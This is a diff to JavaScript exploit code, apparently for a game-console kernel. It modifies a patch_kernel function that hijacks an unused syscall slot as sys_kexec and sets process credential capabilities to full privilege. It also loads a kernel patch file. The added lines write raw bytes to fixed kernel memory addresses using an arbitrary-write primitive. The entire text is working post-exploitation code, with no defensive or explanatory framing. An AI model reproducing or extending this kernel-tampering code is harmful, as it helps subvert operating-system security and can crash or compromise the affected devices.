@@ -1501,7 +1501,7 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
         throw RangeError('kernel patching unsupported');
     }
 
-   // log('change sys_aio_submit() to sys_kexec()');
+   log('change sys_aio_submit() to sys_kexec()');
     // sysent[661] is unimplemented so free for use
      const offset_sysent_661 = 0x1107f00;
     const sysent_661 = kbase.add(offset_sysent_661);
@@ -1519,6 +1519,8 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     // cr_sceCaps[1]
     kmem.write64(p_ucred.add(0x68), -1);
 
+
+    
     const buf = await get_patches('./kpatch/900.elf');
     // FIXME handle .bss segment properly
     // assume start of loadable segments is at offset 0x1000
@@ -1597,6 +1599,22 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     localStorage.ExploitLoaded="yes"
     sessionStorage.ExploitLoaded="yes"
     //alert("kernel exploit succeeded!");
+
+    const PATCH_ADDR1 = 0x462D29;
+const PATCH_ADDR2 = 0x462D41;
+
+ 
+const bytes = [0xC1, 0x98, 0xDE];
+
+ 
+for (let i = 0; i < bytes.length; i++) {
+      kmem.write8(PATCH_ADDR1 + i, bytes[i]);
+}
+
+ 
+   for (let i = 0; i < bytes.length; i++) {
+       kmem.write8(PATCH_ADDR2 + i, bytes[i]);
+     }
 }
 
 
